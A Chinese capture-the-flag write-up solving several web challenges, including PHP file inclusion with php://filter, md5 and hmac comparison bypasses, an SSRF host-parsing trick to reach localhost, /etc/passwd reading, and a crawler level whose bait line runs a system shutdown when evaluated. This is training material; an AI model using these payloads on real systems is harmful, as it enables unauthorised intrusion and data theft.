<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>第一步也是看见了文件包含，又是<code>str_replace</code>，大概又是双写绕过，构造如下:</p>
<p><code>http://118.24.25.25:9999/easyphp/img/index.php?img=....//flag</code></p>
<p>没有得到flag，出来一句：<code>maybe_you_should_think_think</code>…想想也是，既然已经week2，肯定不会那么简单…由于通过 include_once 方式将文件执行，如果没有进行输出操作就无法显示出来；</p>
<p>第二步尝试使用php伪协议，构造如下：</p>
<p><code>http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag</code></p>
<p>得到base64编码：</p>
<p><code>PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK</code></p>
<p>解码即可：</p>
<p><img src="https://s2.ax1x.com/2019/02/19/kgWSjs.png" alt="kgWSjs.png"></p>
<h3 id="phptrick"><a href="#phptrick" class="headerlink" title="phptrick"></a>phptrick</h3><p>给出源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>访问 admin.php 返回 “only localhost can see it”；那就11个判断，逐个击破：</p>
<p><strong>step1~2</strong></p>
<p>弱判断<strong>(!=)</strong>，使得str1和str2的md5值相等(==)，很简单，使用<code>str1=240610708&amp;str2=QNKCDZO</code>直接绕过；</p>
<p><strong>step3~4</strong></p>
<p>强判断<strong>(!==)</strong>，使得str3和str4的md5值相等(===)，直接数组绕过即可：<code>str3[]=a&amp;str4[]=b</code></p>
<p><strong>step5~8</strong></p>
<p>php 处理参数时会将参数名中的 “.” 替换为 “_”，所以即可构造<code>H.game</code>变量即可绕过step5；</p>
<p>构造数组绕过数字判断返回false，大小判断返回false，string以后产生Array，即可返回false：<code>H.game[]=1</code>；</p>
<p><strong>step9~11</strong></p>
<p>一开始没看懂，科普了一下大概是明白了，要求<code>PHP_URL_SCHEME</code>必须是<code>http</code>，<code>PHP_URL_HOST</code>必须是<code>www.baidu.com</code>，但是上述又必须localhost才可以访问，无从下手……</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://www.runoob.com/"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>大概可以看懂，其实就是设置访问某个url资源，必须要成功访问，即可让<code>curl_exec</code>返回true，Google到一下资料学习到了：</p>
<blockquote>
<p>当url中有多个@符号时，<strong>parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的</strong>。因此当代码对<a href="mailto:`user@eval.com" target="_blank" rel="noopener">`user@eval.com</a>:<a href="mailto:80@baidu.com" target="_blank" rel="noopener">80@baidu.com</a>` 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过</p>
<p>source:<a href="https://xz.aliyun.com/t/2215" target="_blank" rel="noopener">https://xz.aliyun.com/t/2215</a></p>
</blockquote>
<p>即可构造如下：<code>url=http://@127.0.0.1:80@www.baidu.com/admin.php</code></p>
<p>得到admin.php的内容：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为有<code>file_exists</code>，直接查看<code>flag.php</code>肯定是不行的，那就继续构造php伪协议绕过即可：</p>
<p><code>?filename=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>得到：</p>
<p><code>PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo=</code></p>
<p>base64解码得flag：</p>
<p><img src="https://s2.ax1x.com/2019/02/19/kgoarQ.png" alt="kgoarQ.png"></p>
<h3 id="php-is-the-best-language"><a href="#php-is-the-best-language" class="headerlink" title="php is the best language"></a>php is the best language</h3><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);  <span class="comment">//传door[]置空secret</span></span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);         <span class="comment">//gate即可解出</span></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们可以发现关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);  <span class="comment">//传door[]置空secret</span></span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);         <span class="comment">//gate即可解出</span></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p><code>hash_hmac ( string $algo , string $data , string $key)</code>函数的data部分如果传入的为数组，则会返回<code>NULL</code>，所以即可将<code>$door</code>参数传入数组，即可得到可控的<code>$gate</code>，所以就直接可以绕过第二个if判断；</p>
</li>
<li><p>经过两次<code>md5</code>函数以后进行弱判断(==)，可以直接爆破：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">1</span>;$x&lt;<span class="number">100000000</span>;$x++)&#123;</span><br><span class="line">	<span class="keyword">if</span> ((md5($x)+<span class="number">1</span>) == (md5(md5($x)))+<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $x;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">12</span>[Finished in <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure>
</li>
<li><p>直接GET一个<code>$door</code>传一个数组，<code>$key=12</code>，可控的<code>$gate</code>为<code>key</code>的<code>sha256</code>值；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sec=<span class="keyword">NULL</span>;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>,<span class="string">'12'</span>,$sec);</span><br><span class="line"><span class="keyword">echo</span> $gate;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4217722</span>a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf[Finished in <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?door[]=1&amp;key=12&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="BabySpider"><a href="#BabySpider" class="headerlink" title="BabySpider"></a>BabySpider</h3><p>这题考察python爬虫的编写能力，python渣渣写过点爬虫，正好拿来实战一下，不得不说这个题出的确实是好，也让我了解到了许多反爬的机制，下面就详细讲解一下做题的艰辛过程：</p>
<h4 id="1-10关"><a href="#1-10关" class="headerlink" title="1-10关"></a>1-10关</h4><p>其实就是简单的爬取页面，进行信息筛选，执行一下post回去即可，我当然会想的这么简单；</p>
<h4 id="11-20关"><a href="#11-20关" class="headerlink" title="11-20关"></a>11-20关</h4><p>然后就关机了…</p>
<p>一开始我以为是pycharm的锅，没想到第二次运行还是关机…瞬间爆炸（surprise mother f**ker）肯定是出题人调皮了…真的是秀（这反爬虫机制是真的骚~）</p>
<p>果然爬完第十关以后直接爬出11关的内容就要break观察一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> __g: [(os.system(<span class="string">'shutdown -s -t 0'</span>), (os.system(<span class="string">'shutdown now'</span>), <span class="keyword">None</span>)[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'os'</span>] <span class="keyword">in</span> [(__import__(<span class="string">'os'</span>, __g, __g))]][<span class="number">0</span>])(globals())<span class="comment">#-----=?</span></span><br></pre></td></tr></table></figure>
<p>大概是调用了一个os模块直接给我调用系统命令直接<code>shutdown</code>了，直接<code>eval()</code>肯定会关机；解决方法就是在http请求内容里加上UA头即可解决关机的困扰…</p>
<p>如果你认为这就结束了那就太天真了…加上以后继续报错…</p>
<p>不知道该肿么办啦…只好去看看官方wp，了解到了另一种反爬虫机制，具体解析如下：</p>
<p>打印好第11关的cookie，首先拿token登录，将页面的cookie修改为第11关的cookie，刷新页面：</p>
<p><a href="https://imgchr.com/i/k7yYhn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7yYhn.md.png" alt="k7yYhn.md.png"></a></p>
<p>发现网页显示的数字和要爬取的信息不一致（算式和之前的都不一样，答案还对个锤子？）：</p>
<p><img src="https://s2.ax1x.com/2019/02/28/k7y6hR.png" alt="k7y6hR.png"></p>
<p><img src="https://s2.ax1x.com/2019/02/28/k7yWjK.png" alt="k7yWjK.png"></p>
<p>继续在页面里搜索，发现style.css中的内容，原来是存在一个<code>Ariali.otf</code>文件：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">font-face</span> &#123;</span><br><span class="line">      <span class="attribute">font-family</span>: Ariali;</span><br><span class="line">      <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'/static/Ariali.otf'</span>);</span><br><span class="line">      <span class="attribute">font-weight</span>: normal;</span><br><span class="line">      <span class="attribute">font-style</span>: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看文件内容：</p>
<p><img src="https://s2.ax1x.com/2019/02/28/k7j3bF.png" alt="k7j3bF.png"></p>
<p>字体文件被动了手脚，数字的对应关系被打乱了，那么找到对应关系，将之前的公式恢复出来执行即可得到正确的答案；原来数字和替换后数字的对应关系如下，写个字典或者列表替换一下即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4 5 6 7 8 9 0</span><br><span class="line">| | | | | | | | | |</span><br><span class="line">0 2 6 9 4 3 5 8 7 1</span><br></pre></td></tr></table></figure>
<h4 id="21-30关"><a href="#21-30关" class="headerlink" title="21-30关"></a>21-30关</h4><p>到21关时候又报错了…打个CTF真辛苦啊…</p>
<p><img src="https://s2.ax1x.com/2019/02/28/kHAkr9.png" alt="kHAkr9.png"></p>
<p>再次使用第20关的cookie替换，查看到爬取到的表达式和页面上的又不一样…而且还不满足11-20关的替换关系，</p>
<p><a href="https://imgchr.com/i/kHApCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHApCT.md.png" alt="kHApCT.md.png"></a></p>
<p>再次查看源码，在css中的after元素中找到了真的表达式：</p>
<p><a href="https://imgchr.com/i/kHAe56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHAe56.md.png" alt="kHAe56.md.png"></a></p>
<p>手速比较快的话，还是可以看到的（和上面的cookie不一样，所以表达式不一样）：</p>
<p><a href="https://imgchr.com/i/kHATd1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHATd1.md.png" alt="kHATd1.md.png"></a></p>
<p>所以只要抓取css样式里的表达式即可：</p>
<p>解题脚本(python3)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">"http://111.231.140.29:10000/"</span></span><br><span class="line">url1=<span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url2=<span class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url3=<span class="string">"http://111.231.140.29:10000/statics/style.css"</span></span><br><span class="line">head=&#123;<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0"</span>&#125;</span><br><span class="line">token=&#123;<span class="string">"token"</span>:<span class="string">"phatlrSLFTDHSXiuD0wbG9DczhKcXRCm"</span>&#125;</span><br><span class="line">str1=[<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>]</span><br><span class="line">str2=[<span class="string">'0'</span>,<span class="string">'2'</span>,<span class="string">'6'</span>,<span class="string">'9'</span>,<span class="string">'4'</span>,<span class="string">'3'</span>,<span class="string">'5'</span>,<span class="string">'8'</span>,<span class="string">'7'</span>,<span class="string">'1'</span>]</span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=token)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line">session=r.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">        print(<span class="string">"*"</span>*<span class="number">20</span>+str(i+<span class="number">1</span>)+<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line">        num=re.findall(<span class="string">r'&lt;span&gt;(.*?)&lt;/span&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        res=eval(num[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">        print(num+<span class="string">"  "</span>+str(res))</span><br><span class="line">        answer=&#123;<span class="string">"answer"</span>:res&#125;</span><br><span class="line">        r=requests.post(url2,data=answer,cookies=session,headers=head)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        session=r.cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i&gt;<span class="number">9</span> <span class="keyword">and</span> i&lt;<span class="number">20</span>:</span><br><span class="line">        print(<span class="string">"*"</span> * <span class="number">20</span> + str(i + <span class="number">1</span>) + <span class="string">"*"</span> * <span class="number">20</span>)</span><br><span class="line">        num = re.findall(<span class="string">r'&lt;span&gt;(.*?)&lt;/span&gt;'</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">        num1=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">                subscript = str1.index(i)</span><br><span class="line">                num1 += str2[subscript]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num1 += i</span><br><span class="line">        res = eval(num1[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">        print(num1 + <span class="string">"  "</span> + str(res))</span><br><span class="line">        answer = &#123;<span class="string">"answer"</span>: res&#125;</span><br><span class="line">        r = requests.post(url2, data=answer, cookies=session, headers=head)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        session = r.cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i&gt;<span class="number">19</span>:</span><br><span class="line">        print(<span class="string">"*"</span>*<span class="number">20</span>+str(i+<span class="number">1</span>)+<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line">        response=requests.get(url3,cookies=session,headers=head)</span><br><span class="line">        response.encoding=response.apparent_encoding</span><br><span class="line">        num=re.findall(<span class="string">r'content:"(.*?)='</span>,response.text)[<span class="number">0</span>]</span><br><span class="line">        res=eval(num)</span><br><span class="line">        print(num+<span class="string">"  "</span>+str(res))</span><br><span class="line">        answer=&#123;<span class="string">"answer"</span>:res&#125;</span><br><span class="line">        r=requests.post(url2,data=answer,cookies=session,headers=head)</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        session=r.cookies</span><br><span class="line"><span class="keyword">if</span> <span class="string">"hgame"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<p><a href="https://imgchr.com/i/kHVkA1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHVkA1.md.png" alt="kHVkA1.md.png"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;9242455136c7afcc0d75204281e558ab63ac9a841e514a37e6702f15f21f3e01&#125;</span><br></pre></td></tr></table></figure>
<p><strong>这题出的真的是好，花了很长时间才解出来，归纳一下：</strong></p>
<ol>
<li><strong>还是不要只刷CTF题忘记原理的理解，类似于UA头，referer，此类的反爬虫措施还是很常见的，还有就是实际爬虫不注意说不定会被反日…</strong></li>
<li><strong>两个trick分别是对应了猫眼电影和汽车之家的前端反爬机制，利用视觉差异来欺骗爬虫而不影响正常的用户，如果不加注意，那么爬到的数据有可能就是一堆毫无作用的数据；</strong></li>
</ol>
<h3 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h3><p>通过第一关以后发现第二关的题目是一张图片，查看图片地址发现地址为：<code>cXVlc3Rpb24ucG5n.php</code>，base64解码以后发现为<code>question.png</code>，想到任意文件读取漏洞，尝试<code>../../../../../etc/passwd.php</code>（base64以后），发现可以成功读取：</p>
